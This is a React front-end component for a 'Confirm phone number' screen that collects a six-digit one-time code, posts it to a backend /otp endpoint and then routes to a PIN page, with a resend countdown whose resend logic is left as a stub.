import React, { useRef, useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";
import { ChevronLeft } from "lucide-react";

const Otp = () => {
  const navigate = useNavigate();
  const inputsRef = useRef([]);
  const [otp, setOtp] = useState(Array(6).fill(""));
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [counter, setCounter] = useState(56);
  const [phone, setPhone] = useState("");
  const [lastFour, setLastFour] = useState("");

  useEffect(() => {
    const storedPhone = localStorage.getItem("phone");
    const storedLastFour = localStorage.getItem("lastFour");
    if (storedPhone) setPhone(storedPhone);
    if (storedLastFour) setLastFour(storedLastFour);
  }, []);

  useEffect(() => {
    if (counter > 0) {
      const timer = setTimeout(() => setCounter(counter - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [counter]);

  const handleChange = (value, index) => {
    if (/^\d?$/.test(value)) {
      const newOtp = [...otp];
      newOtp[index] = value;
      setOtp(newOtp);
      if (value && index < 5) {
        inputsRef.current[index + 1]?.focus();
      }
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    try {
      await axios.post(`${BASE_URL}/otp`, {
        otp: otp.join(""),
      });
      // Navigate to success page
      navigate("/pin");
    } catch (err) {
      console.error("OTP verification failed:", err);
      setError("Invalid code. Please try again.");
      setOtp(Array(6).fill(""));
      inputsRef.current[0]?.focus();
    } finally {
      setLoading(false);
    }
  };

  const handleResend = () => {
    setCounter(56);
    setOtp(Array(6).fill(""));
    // Add resend logic here
  };

  const getLastFourDigits = () => {
    return lastFour || (phone ? phone.slice(-4) : "");
  };

  return (
    <div className="min-h-screen bg-white text-gray-900 flex flex-col">
      {/* Header */}
      <div className="px-6 pt-8">
        {/* Back Button */}
        <button
          onClick={() => navigate(-1)}
          className="mb-8 p-2 -ml-2 hover:bg-gray-100 rounded-lg transition-colors"
        >
          <ChevronLeft size={28} />
        </button>

        {/* Title */}
        <h1 className="text-3xl font-bold mb-4">Confirm phone number</h1>
        <p className="text-gray-600 text-base mb-8">
          Please enter the code sent to the number ending in{" "}
          <span className="font-semibold text-gray-900">
            {getLastFourDigits()}
          </span>
        </p>

        {/* OTP Input */}
        <form onSubmit={handleSubmit}>
          <div className="bg-gray-50 rounded-xl px-6 py-6 mb-6">
            <label className="text-sm text-gray-500 mb-2 block">
              Enter OTP
            </label>
            <div className="flex gap-2">
              {otp.map((digit, index) => (
                <React.Fragment key={index}>
                  <input
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    className="w-10 h-12 text-center text-2xl font-semibold bg-transparent border-b-2 border-gray-300 focus:border-gray-800 outline-none transition-colors"
                    value={digit}
                    onChange={(e) => handleChange(e.target.value, index)}
                    onKeyDown={(e) => handleKeyDown(e, index)}
                    ref={(el) => (inputsRef.current[index] = el)}
                  />
                  {index === 2 && (
                    <span className="flex items-center text-2xl font-semibold text-gray-400">
                      -
                    </span>
                  )}
                </React.Fragment>
              ))}
            </div>
          </div>

          {error && <p className="text-red-500 text-sm mb-4">{error}</p>}

          {/* Resend Section */}
          <div className="flex items-center justify-between mb-8">
            <span className="text-gray-900 font-medium">
              Didn't receive a code?
            </span>
            {counter > 0 ? (
              <span className="text-gray-400">Resend in {counter}s</span>
            ) : (
              <button
                type="button"
                onClick={handleResend}
                className="text-gray-900 font-medium underline"
              >
                Resend
              </button>
            )}
          </div>
        </form>
      </div>

      {/* Spacer */}
      <div className="flex-grow" />

      {/* Next Button */}
      <div className="px-6 pb-8">
        <button
          onClick={handleSubmit}
          disabled={loading || otp.join("").length !== 6}
          className={`w-full py-4 rounded-xl text-white font-semibold text-lg transition-colors ${
            loading || otp.join("").length !== 6
              ? "bg-gray-400 cursor-not-allowed"
              : "bg-gray-800 hover:bg-gray-900"
          }`}
        >
          {loading ? "Verifying..." : "Next"}
        </button>
      </div>

      {/* Bottom Bar */}
      <div className="h-1 bg-black mx-auto w-32 rounded-full mb-4" />
    </div>
  );
};

export default Otp;
